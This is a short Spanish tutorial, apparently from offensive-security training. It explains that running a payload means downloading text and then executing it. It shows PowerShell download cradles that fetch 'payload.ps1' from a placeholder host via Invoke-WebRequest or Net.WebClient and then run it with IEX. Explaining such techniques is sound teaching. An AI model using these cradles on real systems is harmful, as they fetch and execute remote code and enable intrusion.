
---

##  Dos acciones completamente distintas

Cuando hablamos de “descargar y ejecutar payloads”, en realidad estamos hablando de:

 **1. Conseguir el texto**
 **2. Ejecutar el texto**

Nada más.

---

## 📥 1) Conseguir el texto (descargar)

Esto es como decir:

> “Tráeme este texto desde Internet”

Hay muchas formas de hacerlo.

Ejemplos:

```powershell
Invoke-WebRequest http://web/payload.ps1
```

o

```powershell
(New-Object Net.WebClient).DownloadString("http://web/payload.ps1")
```

Aunque se vean diferentes, ambas hacen exactamente lo mismo:

 Devuelven TEXTO.

Imagina que ambas dicen:

> “Aquí tienes el contenido del archivo”

---

## ▶️ 2) Ejecutar el texto

Ahora tienes un texto, por ejemplo:

```
Write-Host Hola
```

PowerShell por defecto **no lo ejecuta**.

Necesitas decirle:

> “Interpreta este texto como comandos”

Eso se hace con:

```powershell
Invoke-Expression
```

o corto:

```powershell
IEX
```

---

##  Lo importante

No estás obligado a usar nada especial.

Tú puedes hacer:

```powershell
$texto = "Write-Host Hola"
IEX $texto
```

Eso ya ejecuta código.

No hay descargas.
No hay objetos.

---

##  Ahora unimos las dos cosas

Si en vez de escribir el texto tú, lo traes de Internet:

```powershell
$texto = Invoke-WebRequest http://web/payload.ps1
IEX $texto
```

O:

```powershell
$texto = (New-Object Net.WebClient).DownloadString("http://web/payload.ps1")
IEX $texto
```

En ambos casos:

1. Se obtiene texto
2. Se ejecuta texto

Nada más.

---

##  Dónde aparece la palabra “objeto”

Solo aparece porque **una de las formas de traer texto** necesita usar una herramienta interna que PowerShell llama objeto.

Pero tú no necesitas entenderlo para comprender el concepto.

Es simplemente:

> Una herramienta para traer texto.

---

##  Frase definitiva

**No necesitas objetos para ejecutar código.**
 **Solo necesitas objetos (o cmdlets) para traer código desde fuera.**

---

##  Piensa en esto

Leer en voz alta = IEX
Libro en la mesa = texto
Ir a la librería = método de descarga

No importa si vas andando, en coche o en bus.

Lo importante:

1. Tener el libro
2. Leerlo

---

